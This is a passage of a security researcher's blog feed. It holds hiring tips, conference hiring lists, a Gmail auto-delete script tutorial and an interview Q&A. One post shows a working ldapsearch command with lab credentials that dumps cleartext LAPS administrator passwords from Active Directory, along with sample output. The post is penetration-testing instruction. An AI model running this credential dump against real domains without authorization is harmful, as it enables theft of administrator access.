&lt;li&gt;If you don&amp;rsquo;t ask follow up questions, I won&amp;rsquo;t have any either, like &amp;ldquo;would you like the job?&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Exaggerating on your resume isn&amp;rsquo;t a good idea, but if you do, be ready to explain it&lt;/li&gt;
&lt;li&gt;The company is going to look at your social media. Privacy concerns? Don&amp;rsquo;t post publicly. Don&amp;rsquo;t get sassy in the interview about it.&lt;/li&gt;
&lt;li&gt;Dropping a vuln in the company during the interview is a stupid move. (Personal experience)&lt;/li&gt;
&lt;li&gt;Your attire matters. If you look like you just got out of bed, I&amp;rsquo;ll probably just let you go back to it.&lt;/li&gt;
&lt;li&gt;Being honest about not knowing something is great. Emailing after the interview that you researched it and now understand it is AWESOME!&lt;/li&gt;
&lt;li&gt;It is always ok to ask why you didn&amp;rsquo;t get the job and where you can improve. Unfortunately straight answers aren&amp;rsquo;t always possible.&lt;/li&gt;
&lt;li&gt;Like college, trying many types of Infosec jobs will make you better at all of them.&lt;/li&gt;
&lt;li&gt;Stay humble.&lt;/li&gt;
&lt;li&gt;If you were referred by a friend that works there already, respect the fact that you are representing them as well.&lt;/li&gt;
&lt;li&gt;Making money is better than not. If you think you are too good to be a Walmart greeter, you are probably too good for this job too.&lt;/li&gt;
&lt;li&gt;Try not to take it personally if you don&amp;rsquo;t get the job today. You might be able to apply later. You won&amp;rsquo;t if you lash out.&lt;/li&gt;
&lt;li&gt;Contributions to open source projects isn&amp;rsquo;t required, but is a good way to demonstrate values, skills, and mindset.&lt;/li&gt;
&lt;li&gt;Don&amp;rsquo;t whine and complain during an interview. It&amp;rsquo;s ok to point out deficiencies, or answer why you left your last job but keep it brief.&lt;/li&gt;
&lt;li&gt;Set expectations and ask questions like: Can I ping you if I haven&amp;rsquo;t heard from you in a week? What should I wear to the interview&lt;/li&gt;
&lt;li&gt;Minimal self deprecation is fine, but if you spend the whole interview talking about how much you suck, I&amp;rsquo;ll believe it.&lt;/li&gt;
&lt;li&gt;Include &amp;ldquo;Selected Accomplishments&amp;rdquo; part in your resume. 2-4 things that you are particularly proud of, doesn&amp;rsquo;t have to be done at work.&lt;/li&gt;
&lt;li&gt;The question &amp;ldquo;where do you want to be / doing 2/4/10 years&amp;rdquo; is a standard question. &amp;ldquo;I don&amp;rsquo;t know&amp;rdquo; is ok, but a prepared answer is better.&lt;/li&gt;
&lt;li&gt;Sarcasm is taken differently by everyone. Might go over good or bad. If it&amp;rsquo;s how you deal w/ nervousness, practice interviewing more.&lt;/li&gt;
&lt;li&gt;Practice interviewing. Find someone that will give you candid feedback and interview for positions you want with them.&lt;/li&gt;
&lt;li&gt;Don&amp;rsquo;t take an interview call in a crowded or loud place. Rescheduling is totally ok as long as it&amp;rsquo;s done with more than 24 hours notice.&lt;/li&gt;
&lt;li&gt;The saying &amp;ldquo;It&amp;rsquo;s not what, but who you know&amp;rdquo; is unfortunately true a lot of times. But it is because &lt;em&gt;who&lt;/em&gt; you know can vouch for &lt;em&gt;what&lt;/em&gt; you know.&lt;/li&gt;
&lt;li&gt;Just because someone is a manager doesn&amp;rsquo;t mean they can&amp;rsquo;t run circles around you technically and are just acting dumb. (Personal experience)&lt;/li&gt;
&lt;li&gt;If your LinkedIn profile does not match up with your resume, you will probably be asked about it. (i.e. degree, certs, jobs mismatch)&lt;/li&gt;
&lt;li&gt;Ask about travel and feel free to ask to talk to potential co-workers about travel and other topics to get the ground truth.&lt;/li&gt;
&lt;li&gt;Offer letters and nearly all hiring / new-hire documents are contracts. You can &amp;ldquo;X&amp;rdquo; out anything you don&amp;rsquo;t agree with. $employer will have to approve the change.&lt;/li&gt;
&lt;li&gt;When asked to list one or more strengths or weaknesses: Strengths: stay humble, Weaknesses: share how you are working to get better&lt;/li&gt;
&lt;li&gt;Everything on the Internet is suspect. Trust but verify right? Learn things for yourself. Blog, tweet, share how/what you learned. YMMV.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Have some yourself? I would love to add it! Please just tweet a reply via Twitter to me and I&amp;rsquo;ll get it added. Thanks!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>A Few Changes</title>
      <link>https://malicious.link/post/2018/a-few-changes/</link>
      <pubDate>Mon, 09 Jul 2018 11:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/a-few-changes/</guid>
      <description>&lt;p&gt;For nearly a year I left a CoinHive miner up on the blog so that people that didn&amp;rsquo;t feel like or couldn&amp;rsquo;t afford a way to support the blog could do so via a bit of CPU power. Unfortunately during that time lots of malware started to use services like coinhive and I quickly started recieving warning that my site had been &amp;ldquo;hacked&amp;rdquo; or was showing up as malicious (har har). Well, finally got off my butt and removed it. Sorry to my readers who had to deal with it.&lt;/p&gt;

&lt;p&gt;More later! Lots of fun stuff to come.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2018 ShmooCon Hiring List</title>
      <link>https://malicious.link/post/2017/2018-shmoocon-hiring-list/</link>
      <pubDate>Thu, 28 Dec 2017 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/2018-shmoocon-hiring-list/</guid>
      <description>&lt;p&gt;&lt;center&gt;&lt;iframe width=&#34;405&#34; height=&#34;208&#34; src=&#34;https://w2.countingdownto.com/2049915&#34; frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;

&lt;p&gt;Created the 2018 UNOFFICIAL &lt;a href=&#34;http://shmoocon.org/&#34;&gt;ShmooCon&lt;/a&gt; Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/aDRYaH5wubSqWcUk1&#34;&gt;https://goo.gl/forms/aDRYaH5wubSqWcUk1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/10BXjzS1KsaWFkQkAjlox3Chrk5wD1lgUf1RWi50Jiso/&#34;&gt;https://docs.google.com/spreadsheets/d/10BXjzS1KsaWFkQkAjlox3Chrk5wD1lgUf1RWi50Jiso/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;900&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vQotxxtoByz-ZvGipDrgRc2DqSkjlcJjMLaHvqY1vYQMY0r7pWMQCteniEE9ef-cyHEWugdTYbbu8Y5/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Open Source Pentesting</title>
      <link>https://malicious.link/post/2017/open-source-pentesting/</link>
      <pubDate>Fri, 27 Oct 2017 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/open-source-pentesting/</guid>
      <description>&lt;p&gt;My talk today at &lt;a href=&#34;http://wildwesthackinfest.com/&#34;&gt;Wild West Hacking Fest&lt;/a&gt; was about some documents that I released here. I&amp;rsquo;ll make this blog post more indepth later but for right now I wanted to get the slides out.&lt;/p&gt;

&lt;p&gt;(If you can&amp;rsquo;t access one of the documents yet, don&amp;rsquo;t ask for permission to do so, it just means either they aren&amp;rsquo;t ready yet, I&amp;rsquo;ll make posts about each one as they become available)&lt;/p&gt;

&lt;p&gt;Here is the main slide deck for the docs: &lt;a href=&#34;https://bit.ly/OpenSourcePentest&#34;&gt;https://bit.ly/OpenSourcePentest&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here are the slides for the release talk (not the same as the link above):&lt;/p&gt;

&lt;iframe src=&#34;https://docs.google.com/presentation/d/e/2PACX-1vRuow-CSzZ7VCmUePL2uPKJUZ7fbGskHpFjKgWwpARTGr9crbgJnWCamA6Yg20K02uWDpQotGOXucPg/embed?start=true&amp;loop=true&amp;delayms=3000&#34; frameborder=&#34;0&#34; width=&#34;960&#34; height=&#34;569&#34; allowfullscreen=&#34;true&#34; mozallowfullscreen=&#34;true&#34; webkitallowfullscreen=&#34;true&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>2017 GrrCon Hiring List</title>
      <link>https://malicious.link/post/2017/2017-grrcon-hiring-list/</link>
      <pubDate>Mon, 16 Oct 2017 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/2017-grrcon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2017 UNOFFICIAL &lt;a href=&#34;http://grrcon.com/&#34;&gt;GrrCon&lt;/a&gt; Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/ddfN6gHPbCJweGUw2&#34;&gt;https://goo.gl/forms/ddfN6gHPbCJweGUw2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/18YEyfp3ctrCz3WgaCArKp0wLn0xWEfV99X-UDmhy4D0/&#34;&gt;https://docs.google.com/spreadsheets/d/18YEyfp3ctrCz3WgaCArKp0wLn0xWEfV99X-UDmhy4D0/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;900&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vQHwcCjBeNMpW-KsLC1ghVBMO5xGor03XfOMCQUo7IC7P-E3o8K69RnErKLtqy9l6K_hIG2Sqbssc_I/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Automatically deleting old Gmail email</title>
      <link>https://malicious.link/post/2017/automatically-deleting-old-gmail-mail/</link>
      <pubDate>Thu, 12 Oct 2017 11:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/automatically-deleting-old-gmail-mail/</guid>
      <description>&lt;p&gt;Like many of you I&amp;rsquo;m a gmail hoarder. I never deleting anything, just &amp;ldquo;archive&amp;rdquo; everything. I &amp;ldquo;might&amp;rdquo; need it later, or &amp;ldquo;I&amp;rsquo;ll get to it when I have time&amp;rdquo;. If we get really honest with ourselves, we never will actually get to it, and because we have this buffer, this procrastination opportunity, we grab it. We use words like &amp;ldquo;but I may need proof of X&amp;rdquo;, or &amp;ldquo;I could need to reference this&amp;rdquo;, or &amp;ldquo;I don&amp;rsquo;t really want to put this person in my contacts so I&amp;rsquo;ll just save the email&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;Personally I have made a choice to force myself to be more engaged in my email going forward. I have set a Google Script to run through all of my email every day and if it is older than 90 days, and doesn&amp;rsquo;t have the specail label &amp;ldquo;keep&amp;rdquo; on it, it&amp;rsquo;s gone. I obviously didn&amp;rsquo;t care enough about whatever was going on in that email to take the time to respond to it.&lt;/p&gt;

&lt;p&gt;Whatever your reason for finding this post, here is how I got it done:&lt;/p&gt;

&lt;p&gt;At first I started with just searching for a way to make a simple filter to do this. There are plenty of blog posts that show you this is possible, but it turns out that at some point Gmail switched to only applying filters to incoming messages (makes sense, lots less overhead, no need to load EVERYONEs email every hour). This makes deleting messages older than X impossible with simple filters however. I did however learn of a search query term you can use to find messages/threads older than X. Imaginatively called &lt;code&gt;older_than:&lt;/code&gt;. So a search in Gmail for &lt;code&gt;older_than:90d&lt;/code&gt; resulted in exactly the emails I wanted to find.&lt;/p&gt;

&lt;p&gt;That&amp;rsquo;s when I started looking into Google Scripting. The language is pretty easy and straight forward if you have ever programmed in anything like Javascript or C++.&lt;/p&gt;

&lt;p&gt;Using the API reference here: &lt;a href=&#34;https://developers.google.com/apps-script/reference/gmail/&#34;&gt;https://developers.google.com/apps-script/reference/gmail/&lt;/a&gt; I was able to cobble together the following in about 20 minutes:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function DeleteOldEmail () {
	var threads;
	var thread;

	threads = GmailApp.search(&amp;quot;older_than:90d&amp;quot;);
	for(var i = 0; i &amp;lt; threads.length; i++)
	{
		var thread = threads[i];
		GmailApp.moveThreadToTrash(thread);
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, that script leaves a lot to be desired. It doesn&amp;rsquo;t have any case where a label like &amp;ldquo;save&amp;rdquo; or &amp;ldquo;keep&amp;rdquo; might come into play, it just hauls off and deletes everything old. But before we start improving lets show you how it looks when you&amp;rsquo;re actually doing it (I&amp;rsquo;ll comment out the &amp;ldquo;moveThreadToTrash in the screenshots)&lt;/p&gt;

&lt;p&gt;Go to &lt;a href=&#34;https://script.google.com/&#34;&gt;https://script.google.com/&lt;/a&gt; and you&amp;rsquo;ll be presented with a new project if you haven&amp;rsquo;t been here before:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/gmail_delete_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Then, copy and past the code in and save it. It&amp;rsquo;ll ask you to name the project. I just named it DeleteOldEmail. Feel free to name it anything you wish. It is what is going to show up in your Google Security &amp;ldquo;Approve Apps&amp;rdquo; list.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/gmail_delete_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The first time I ran this I commented out the lines for deleting and added in a &amp;ldquo;Logger&amp;rdquo; line just so I knew what would be deleted:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function DeleteOldEmail () {
	var threads;
	var thread;

	threads = GmailApp.search(&amp;quot;older_than:90d&amp;quot;);
	for(var i = 0; i &amp;lt; threads.length; i++)
	{
      var thread = threads[i];
      Logger.log(thread.getFirstMessageSubject())
		//GmailApp.moveThreadToTrash(thread);
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then run it, the first time you run it, it will ask for permissions:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/gmail_delete_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;If you try this out and decide you don&amp;rsquo;t like it you can revoke the permissions here: &lt;a href=&#34;https://myaccount.google.com/permissions&#34;&gt;https://myaccount.google.com/permissions&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/gmail_delete_4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;If you went with the logging you&amp;rsquo;ll see something like this if you go to &lt;strong&gt;View-&amp;gt;Logs&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/gmail_delete_5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Last step is to set this up so it automatically runs, I mean that&amp;rsquo;s the whole point. For that, we go to &lt;strong&gt;Edit-&amp;gt;Current Project&amp;rsquo;s Triggers&lt;/strong&gt;. And we are greeted with the following (once we click to add a new trigger):&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/gmail_delete_6.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I chose to set up mine to run every 12 hours, but you can set it to run once a day, once a week, whatever.&lt;/p&gt;

&lt;p&gt;Again, this script leaves a lot to be desired, You can totally mess with the query search string any way you wish. I&amp;rsquo;ve created a Github repository that I&amp;rsquo;ll put improvements on the script: &lt;a href=&#34;https://github.com/mubix/GScriptOldEmal&#34;&gt;https://github.com/mubix/GScriptOldEmal&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Have fun with it. The two improvments I&amp;rsquo;ll be adding are the label exclusion for &amp;ldquo;keep&amp;rdquo; and notifications (a list of email subjects deleted)&lt;/p&gt;

&lt;p&gt;Thanks for your time.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2017 DerbyCon Hiring List</title>
      <link>https://malicious.link/post/2017/2017-derbycon-hiring-list/</link>
      <pubDate>Sun, 13 Aug 2017 11:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/2017-derbycon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2017 UNOFFICIAL DerbyCon Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/vyqVHjZkxE4WhA9X2&#34;&gt;https://goo.gl/forms/vyqVHjZkxE4WhA9X2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/1tf0C09Cwt6_GBinOjvI714655YdQcxi5k2g6iDzPt9I/&#34;&gt;https://docs.google.com/spreadsheets/d/1tf0C09Cwt6_GBinOjvI714655YdQcxi5k2g6iDzPt9I/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;900&#34; src=&#34;https://docs.google.com/spreadsheets/d/1tf0C09Cwt6_GBinOjvI714655YdQcxi5k2g6iDzPt9I/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Dump LAPS passwords with ldapsearch</title>
      <link>https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/</link>
      <pubDate>Mon, 24 Jul 2017 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/</guid>
      <description>&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/ldapsearch_laps_rights.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;If you&amp;rsquo;ve ever been pentesting an organization that had LAPS, you know that it is the best solution for randomizing local administrator passwords on the planet. (You should just be leaving them disabled).&lt;/p&gt;

&lt;p&gt;LAPS stores it&amp;rsquo;s information in Active Directory:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The expiration time: &lt;code&gt;ms-Mcs-AdmPwdExpirationTime: 131461867015760024&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;And the actual password in clear text: &lt;code&gt;ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When LAPS first came it, any user in Active Directory could read it. Microsoft fixed that, you now have to have the &lt;code&gt;All extended rights&lt;/code&gt; permission to the object or Full Control of it.&lt;/p&gt;

&lt;p&gt;In many organizations, there are pockets of &lt;strong&gt;OU&lt;/strong&gt; admins, or even standard users that are in charge of a specific set of Users and (in particular) computers in which they have full control over.&lt;/p&gt;

&lt;p&gt;There is already a Metasploit module thanks to &lt;a href=&#34;https://github.com/Meatballs1&#34;&gt;Meatballs&lt;/a&gt;:
&lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb&lt;/a&gt;. But, unfortunately I don&amp;rsquo;t always have access to a Meterpreter session to run the module.&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;ldapsearch&lt;/code&gt; (which is included in the package &lt;code&gt;ldapscripts&lt;/code&gt; on Debian/Ubuntu) can be used to make the same query that the module does. Here is an example run:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ldapsearch -x -h 192.168.80.10 -D \
&amp;quot;helpdesk&amp;quot; -w ASDqwe123 -b &amp;quot;dc=sittingduck,dc=info&amp;quot; \
&amp;quot;(ms-MCS-AdmPwd=*)&amp;quot; ms-MCS-AdmPwd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets break this down:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-x&lt;/code&gt; - Use basic authentication&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-h 192.168.80.10&lt;/code&gt; - Connect to the Domain Controller for ldap&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-D &amp;quot;helpdesk&amp;quot; -w ASDqwe123&lt;/code&gt; - Login as the &lt;code&gt;helpdesk&lt;/code&gt; user, with the password &lt;code&gt;ASDqwe123&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-b &amp;quot;dc=sittingduck,dc=info&amp;quot;&lt;/code&gt; - This loads the base LDAP object of the entire domain.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;(ms-MCS-AdmPwd=*)&amp;quot;&lt;/code&gt; - Filter out any objects that I can&amp;rsquo;t see a value for &lt;code&gt;ms-MCS-AdmPwd&lt;/code&gt; for. (If you have rights as that user to see even one Administrator password, this will show it.)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ms-MCS-AdmPwd&lt;/code&gt; - Only show me the &lt;code&gt;ms-MCS-AdmPwd&lt;/code&gt; object (which by default includes the object name and DN so you will still know what host it belongs to)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What does that look like?&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ldapsearch -x -h 192.168.80.10 -D &amp;quot;helpdesk&amp;quot; -w ASDqwe123 -b &amp;quot;dc=sittingduck,dc=info&amp;quot; &amp;quot;(ms-MCS-AdmPwd=*)&amp;quot; ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base &amp;lt;dc=sittingduck,dc=info&amp;gt; with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd
#

# DC1, Domain Controllers, sittingduck.info
dn: CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: 2F1i/++N0H+G]{Y&amp;amp;,F

# SDCLIENT_DAWIN7, LabComputers, Lab, sittingduck.info
dn: CN=SDCLIENT_DAWIN7,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: 8CDR4,2UE8BA{zw2@RR

# SD_WSUS_2012, LabComputers, Lab, sittingduck.info
dn: CN=SD_WSUS_2012,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: +3!UY5@g9B.64RV2z/T

# WIN-PM0ID6F0AHN, LabComputers, Lab, sittingduck.info
dn: CN=WIN-PM0ID6F0AHN,OU=LabComputers,OU=Lab,DC=sittingduck,DC=info
ms-Mcs-AdmPwd: %v!e#7S#{s})+y2yS#(

# search reference
ref: ldap://research.sittingduck.info/DC=research,DC=sittingduck,DC=info

# search reference
ref: ldap://ForestDnsZones.sittingduck.info/DC=ForestDnsZones,DC=sittingduck,D
 C=info

# search reference
ref: ldap://DomainDnsZones.sittingduck.info/DC=DomainDnsZones,DC=sittingduck,D
 C=info

# search reference
ref: ldap://sittingduck.info/CN=Configuration,DC=sittingduck,DC=info

# search result
search: 2
result: 0 Success
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, just having the local admin password doesn&amp;rsquo;t ensure that it&amp;rsquo;s enabled, but there is a good bet that you are good to go now.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;P.S.&lt;/strong&gt; You can also authenticate using Kerberos (think Golden/Silver tickets)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;P.P.S&lt;/strong&gt; Because Windows doesn&amp;rsquo;t (to the best of my knowledge) require signing on Domain Controllers for LDAP connections yet (probably does in 2016 or will soon), with a little bit of coding you can get &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py&#34;&gt;ntlmrelayx&lt;/a&gt; to dump LAPS passwords ;-)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Security Affairs Questions</title>
      <link>https://malicious.link/post/2017/security-affairs-questions/</link>
      <pubDate>Mon, 03 Jul 2017 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/security-affairs-questions/</guid>
      <description>

&lt;p&gt;Soon after I blogged about the &lt;a href=&#34;https://room362.com/post/2016/snagging-creds-from-locked-machines/&#34;&gt;&amp;ldquo;Snagging Creds from Locked Machines&amp;rdquo;&lt;/a&gt; and it went a bit viral for a day, &lt;a href=&#34;https://twitter.com/securityaffairs&#34;&gt;Pierluigi Paganini&lt;/a&gt; from &lt;a href=&#34;http://securityaffairs.co/wordpress/&#34;&gt;SecurityAffairs.co&lt;/a&gt; asked me some great questions, that I failed to answer in a timely manner. They are probably a lot less useful to him now (8 months late), but I thought I would answer them anyways.&lt;/p&gt;

&lt;h3 id=&#34;you-are-one-of-the-most-respected-experts-on-cyber-security-could-you-tell-me-what-your-technical-background-is-and-when-you-started-hacking&#34;&gt;You are one of the most respected experts on cyber security. Could you tell me what your technical background is and when you started hacking?&lt;/h3&gt;

&lt;p&gt;I think my earliest &amp;ldquo;hacking&amp;rdquo; was cheating at video games. I enjoyed learning the mechanics of how the &lt;a href=&#34;https://en.wikipedia.org/wiki/Game_Genie&#34;&gt;Game Genie&lt;/a&gt; and &lt;a href=&#34;https://en.wikipedia.org/wiki/GameShark&#34;&gt;GameShark&lt;/a&gt; worked, and how I could cheat at games much more than playing them. My parents always thought that I ruined the games, but it really was the figuring out how to get the right hex for infinite life or ammo that was the game for me.&lt;/p&gt;

&lt;p&gt;After that I owe my traditional IT / Security learning to the Marine Corps 0651 and 0656 schools, the amazingly patient Marines and civilians at the MARCERT, the &lt;a href=&#34;https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/&#34;&gt;OSCP&lt;/a&gt; and &lt;a href=&#34;http://carnal0wnage.attackresearch.com/&#34;&gt;Chris Gates&amp;rsquo; blog&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&#34;what-was-your-greatest-hacking-challenge&#34;&gt;What was your greatest hacking challenge?&lt;/h3&gt;

&lt;p&gt;My &amp;ldquo;greatest hacking challenge&amp;rdquo; I would say is myself. Self awareness is an ever progressing goal, I attempt to figure out and make myself better every day. I fail at it a lot, but all the best hacks are pure and simple perseverance and I plan to never let this one have the better of me.&lt;/p&gt;

&lt;h3 id=&#34;what-are-the-4-tools-that-cannot-be-missed-in-the-hacker-s-arsenal-and-why&#34;&gt;What are the 4 tools that cannot be missed in the hacker&amp;rsquo;s arsenal and why?&lt;/h3&gt;

&lt;p&gt;So much troll ammo in that question. Or I could go the philosophical route and talk about the mind, and never giving up, but I&amp;rsquo;ll take the question at face value:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;A programming language. Yes, you don&amp;rsquo;t have to know programming to be in &amp;ldquo;Information Security&amp;rdquo; but to be a &amp;ldquo;hacker&amp;rdquo; (in the sense of breaking into systems), knowing &lt;strong&gt;&lt;em&gt;a&lt;/em&gt;&lt;/strong&gt; language will save you when the tool that you need for a very specific use case just doesn&amp;rsquo;t exist. It also helps you when you run into a tool that is broken, that everyone seems to use, but for some reason you are the only one noticing it&amp;rsquo;s broken.&lt;/li&gt;
&lt;li&gt;An Intel NUC (or other computer) with ESXi (or other virtualization) on it. Having a lab, even on a hand-me-down laptop/computer with Virtualbox and trial copies of Windows, I was able to learn more by building whatever application I was trying break into, than I ever would have by poking at it from the Internet.&lt;/li&gt;
&lt;li&gt;A blog. I forget things all the time and I usually use my blog or another note taking method (pen and paper, text editor, telling friends about it), to be able to reference it later when I need it. Even if you are the only reader of your own blog it is hands down one of the best method of learning for me because it forces me to re-do things and revisit my assumptions.&lt;/li&gt;
&lt;li&gt;Metasploit. Mostly because it makes things dead simple, and learning to use it isn&amp;rsquo;t very hard.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;which-are-the-most-interesting-hacking-communities-on-the-web-today&#34;&gt;Which are the most interesting hacking communities on the web today?&lt;/h3&gt;

&lt;p&gt;I&amp;rsquo;ve never really been welcome or even interested in the darker side of hacking communities. I would get caught if I even tried to dive into that world.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;To know one&amp;rsquo;s limitations is to know one&amp;rsquo;s self&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;However, I run &lt;a href=&#34;http://novahackers.com/&#34;&gt;NoVAHackers&lt;/a&gt; with &lt;a href=&#34;https://twitter.com/carnal0wnage&#34;&gt;Chris Gates&lt;/a&gt; so I would be remiss to not mention it, and it&amp;rsquo;s parent &lt;a href=&#34;http://takeonme.org/&#34;&gt;AHA&lt;/a&gt;. Both are great communities with basically a mini-conference every month at the meetings.&lt;/p&gt;

&lt;p&gt;If you don&amp;rsquo;t have a hacker space, or &amp;ldquo;Hackers Association&amp;rdquo; in your area, first, look harder there probably is one that you just haven&amp;rsquo;t found yet, and second, if not, start it. I went to the first 2 or 3 meetings of NoVA Hackers by myself. Don&amp;rsquo;t be deterred by single digit membership or attendance. NoVA Hackers is near ~700 members + another 500 or so alumni since it started in 2009.&lt;/p&gt;

&lt;h3 id=&#34;which-is-the-industry-healthcare-automotive-telecommunication-banking-and-so-on-most-exposed-to-cyber-attacks-and-why&#34;&gt;Which is the industry (healthcare, automotive, telecommunication, banking, and so on) most exposed to cyber attacks and why?&lt;/h3&gt;

&lt;p&gt;Honestly I don&amp;rsquo;t want to answer this. Why would you point at someone and say &amp;ldquo;hit him, he&amp;rsquo;s easier to take down&amp;rdquo;&lt;/p&gt;

&lt;h3 id=&#34;what-scares-you-more-in-the-internet&#34;&gt;What scares you more in the Internet?&lt;/h3&gt;

&lt;p&gt;The fact that people think it&amp;rsquo;s a weapon for or against them.&lt;/p&gt;

